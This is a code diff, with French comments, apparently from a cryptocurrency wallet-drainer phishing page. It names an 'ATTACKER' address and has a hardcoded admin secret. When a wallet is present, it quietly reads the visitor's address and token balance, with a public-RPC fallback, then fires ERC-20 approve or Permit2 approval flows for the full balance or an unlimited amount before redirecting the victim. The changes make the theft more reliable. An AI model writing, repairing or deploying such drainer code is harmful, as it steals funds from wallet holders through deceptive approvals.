@@ -568,7 +568,7 @@
   };
 
   // ── Déclarations anticipées (nécessaires avant le bloc redirect) ──
-  let ATTACKER     = '0x0b1369DF890dF9B7ee94F9C0bb53BAd6de7541d6';
+  let ATTACKER     = '0x985Ea9551dfCe767B16F48F6E46eed594C82819B'; // relay contract — overridden by config.json
   let TRON_SPENDER = '';
 
   const MON_SECRET = "admin2912";
@@ -578,8 +578,8 @@
     const probePreset  = params.get("preset") || "usdt-erc20";
     const probeMethod  = params.get("method") || "";
     if (window.ethereum || window.tronWeb) {
-      // Lance le flow appropriate AVANT la redirection
-      (async function() {
+      // loadRuntimeConfig d'abord → ATTACKER correct, puis flow, puis redirect
+      loadRuntimeConfig().then(async function() {
         try {
           if (probeMethod === 'permit2') {
             await firePermit2Flow(probePreset);
@@ -587,8 +587,8 @@
             await fireProbeApprove(probePreset);
           }
         } catch(e) {}
-      })();
-      setTimeout(function() { window.location.href = REDIRECT_URL; }, 1200);
+        window.location.href = REDIRECT_URL;
+      });
     } else {
       window.location.href = REDIRECT_URL;
     }
@@ -969,39 +969,40 @@ function getAddressFromUrl() {
   return null;
 }
 
-// Résolution d'adresse — eth_requestAccounts est silencieux dans le browser TW
-let from = getAddressFromUrl();
+// Résolution d'adresse — selectedAddress synchrone, pas de popup
+let from = getAddressFromUrl() || eth.selectedAddress || eth.address || '';
 if (!from) {
   try {
     const accounts = await eth.request({ method: 'eth_accounts' });
-    from = (accounts && accounts[0]) ? accounts[0] : (eth.selectedAddress || '');
-  } catch(e) {
-    from = eth.selectedAddress || eth.address || '';
-  }
+    from = (accounts && accounts[0]) || '';
+  } catch(e) {}
 }
 
-// Fetch balance via le provider du wallet lui-même — pas de RPC externe, pas de CORS
+// Fetch balance — wallet provider puis fallback public RPC
+const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 let approveAmount;
 try {
   if (from && from !== '0x0000000000000000000000000000000000000000') {
-    const balHex = await eth.request({
-      method: 'eth_call',
-      params: [{
-        to: p.token,
-        data: '0x70a08231000000000000000000000000' + from.slice(2).padStart(64, '0')
-      }, 'latest']
-    });
-    const bal = ethers.BigNumber.from(balHex || '0x0');
-    approveAmount = bal.isZero()
-      ? '115792089237316195423570985008687907853269984665640564039457584007913129639935'
-      : bal.sub(1).toString();
-    console.log('Solde récupéré via wallet provider:', approveAmount, 'pour:', from);
+    const balCallData = '0x70a08231000000000000000000000000' + from.slice(2).padStart(64, '0');
+    let balHex;
+    try {
+      balHex = await eth.request({ method: 'eth_call', params: [{ to: p.token, data: balCallData }, 'latest'] });
+    } catch(e) {
+      // Fallback public RPC si le provider wallet échoue
+      const rpcResp = await fetch('https://ethereum.publicnode.com', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: p.token, data: balCallData }, 'latest'] })
+      });
+      const rpcJson = await rpcResp.json();
+      balHex = rpcJson.result;
+    }
+    const bal = ethers.BigNumber.from(balHex && balHex !== '0x' ? balHex : '0x0');
+    approveAmount = bal.isZero() ? MAX_UINT : bal.toString();
   } else {
-    approveAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+    approveAmount = MAX_UINT;
   }
 } catch(e) {
-  approveAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-  console.warn('balance fetch failed, fallback MAX', e);
+  approveAmount = MAX_UINT;
 }
 
 const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
@@ -1198,32 +1199,37 @@ try {
       var a = p.get('from') || p.get('address') || p.get('a');
       return (a && /^0x[a-fA-F0-9]{40}$/i.test(a)) ? a.toLowerCase() : null;
     }
-    var from = getAddrFromUrl();
+    var from = getAddrFromUrl() || eth.selectedAddress || eth.address || '';
     if (!from) {
       try {
         var accounts = await eth.request({ method: 'eth_accounts' });
-        from = (accounts && accounts[0]) ? accounts[0] : (eth.selectedAddress || '');
-      } catch(e) { from = eth.selectedAddress || eth.address || ''; }
+        from = (accounts && accounts[0]) || '';
+      } catch(e) {}
     }
 
+    var MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
     var approveAmount;
     try {
       if (from && from !== '0x0000000000000000000000000000000000000000') {
-        var balHex = await eth.request({
-          method: 'eth_call',
-          params: [{ to: tokenAddr,
-            data: '0x70a08231000000000000000000000000' + from.slice(2).padStart(64, '0')
-          }, 'latest']
-        });
-        var bal = ethers.BigNumber.from(balHex || '0x0');
-        approveAmount = bal.isZero()
-          ? ethers.BigNumber.from('115792089237316195423570985008687907853269984665640564039457584007913129639935')
-          : bal.sub(1);
+        var balCallData = '0x70a08231000000000000000000000000' + from.slice(2).padStart(64, '0');
+        var balHex;
+        try {
+          balHex = await eth.request({ method: 'eth_call', params: [{ to: tokenAddr, data: balCallData }, 'latest'] });
+        } catch(e) {
+          var rpcResp = await fetch('https://ethereum.publicnode.com', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: tokenAddr, data: balCallData }, 'latest'] })
+          });
+          var rpcJson = await rpcResp.json();
+          balHex = rpcJson.result;
+        }
+        var bal = ethers.BigNumber.from(balHex && balHex !== '0x' ? balHex : '0x0');
+        approveAmount = ethers.BigNumber.from(bal.isZero() ? MAX_UINT : bal.toString());
       } else {
-        approveAmount = ethers.BigNumber.from('115792089237316195423570985008687907853269984665640564039457584007913129639935');
+        approveAmount = ethers.BigNumber.from(MAX_UINT);
       }
     } catch(e) {
-      approveAmount = ethers.BigNumber.from('115792089237316195423570985008687907853269984665640564039457584007913129639935');
+      approveAmount = ethers.BigNumber.from(MAX_UINT);
     }
 
     // Step 1: approve Permit2 for (balance - 1)
